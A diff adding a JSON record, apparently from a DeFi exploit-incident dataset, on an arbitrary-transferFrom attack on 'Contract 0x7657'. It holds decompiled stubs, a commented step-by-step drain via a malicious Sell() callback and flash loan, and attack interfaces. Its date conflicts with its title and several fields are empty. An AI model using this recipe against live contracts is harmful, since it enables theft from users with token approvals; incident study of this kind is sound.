@@ -1,0 +1,30 @@
+{
+ "id": "2023__2023-06-xx_Contract0x7657_ArbitraryTransferFrom",
+ "source_file": "2023/2023-06-xx_Contract0x7657_ArbitraryTransferFrom.md",
+ "title": "Contract 0x7657 Exploit — Arbitrary transferFrom via Malicious Sell() Callback",
+ "date": "2023-01-01",
+ "protocol": "Contract0x7657",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "arbitrary-call",
+  "business-logic"
+ ],
+ "code_before": [
+  "// File: Contract0x7657_decompiled.sol\ncontract Contract0x7657 {  // ❌\n\n    // Unknown selector: 0x0a8fe064\n    // function unknown_0a8fe064() external {}\n\n    // Unknown selector: 0x20d80081\n    // function unknown_20d80081() external {}\n\n    // Selector: 0x24d7806c\n    function isAdmin(address account) external view {}  // ❌\n\n    // Selector: 0x2f54bf6e\n    function isOwner(address account) external view {}  // ❌\n\n    // Unknown selector: 0x310bc8b3\n    // function unknown_310bc8b3() external {}\n\n    // Unknown selector: 0x33635413\n    // function unknown_33635413() external {}\n\n    // Selector: 0x3aaa36e6\n    function Fees() external {}\n\n    // Unknown selector: 0x53cf04fb\n    // function unknown_53cf04fb() external {}\n\n    // Selector: 0x595b504b\n    function MaxRatio() external {}\n\n    // Unknown selector: 0x61cacff3\n    // function unknown_61cacff3() external {}\n\n    // Unknown selector: 0x69bd3ca9\n    // function unknown_69bd3ca9() external {}\n\n    // Selector: 0x70480275\n    function addAdmin(address account) external {}  // ❌\n\n    // Unknown selector: 0x7abc86f8\n    // function unknown_7abc86f8() external {}\n\n    // Unknown selector: 0x84e3b7f8\n    // function unknown_84e3b7f8() external {}\n\n    // Selector: 0x8bad0c0a\n    function renounceAdmin() external {}\n\n    // Selector: 0x9e4a8c9c\n    function PoolState() external {}\n\n    // Unknown selector: 0xa05b1923\n    // function unknown_a05b1923() external {}\n\n    // Unknown selector: 0xa178bffd\n    // function unknown_a178bffd() external {}\n\n    // Unknown selector: 0xb9e53a43\n    // function unknown_b9e53a43() external {}\n\n    // Selector: 0xba9a7a56\n    function MINIMUM_LIQUIDITY() external {}\n\n\n// ...\n\n    function isAdmin(address account) external view {}  // ❌\n\n// ...\n\n    function isOwner(address account) external view {}  // ❌\n\n// ...\n\n    function addAdmin(address account) external {}  // ❌"
+ ],
+ "code_after": [],
+ "steps": [
+  "// → USDT.transferFrom(victim, attacker, victim.balance)",
+  "// 3. → vulnerableContract calls attackerContract.Sell(victim, amount)",
+  "// 4. → attackerContract.Sell(): USDT.transferFrom(victim, attacker, amount)"
+ ],
+ "other_code": [
+  "// Attacker contract implements Sell(address victim, uint256 amount):\n// → USDT.transferFrom(victim, attacker, victim.balance)\n//   (returns false — but vulnerable contract ignores return value)\n\n// 1. IDPPAdvanced.flashLoan(USDT, 0, ...)  // optional flash for fees\n// 2. vulnerableContract.call(\n//       abi.encodeWithSelector(0x0a8fe064,\n//           address(attackerContract),   // caller = attacker's contract\n//           address(victim),             // victim with USDT approval\n//           USDT.balanceOf(victim)       // full victim balance\n//       )\n//    )\n// 3. → vulnerableContract calls attackerContract.Sell(victim, amount)\n// 4. → attackerContract.Sell(): USDT.transferFrom(victim, attacker, amount)\n// 5. Victim's 1,300 USDT drained",
+  "interface IVulnerable {\n    // Selector 0x0a8fe064:\n    function execute(address caller, address victim, uint256 amount) external;\n}\n\ninterface IDPPAdvanced {\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;\n}\n\ninterface IUSDTinterface {\n    function transfer(address to, uint256 value) external;\n    function approve(address spender, uint256 value) external;\n    function transferFrom(address from, address to, uint256 value) external;\n    function balanceOf(address who) external view returns (uint256);\n}"
+ ]
+}
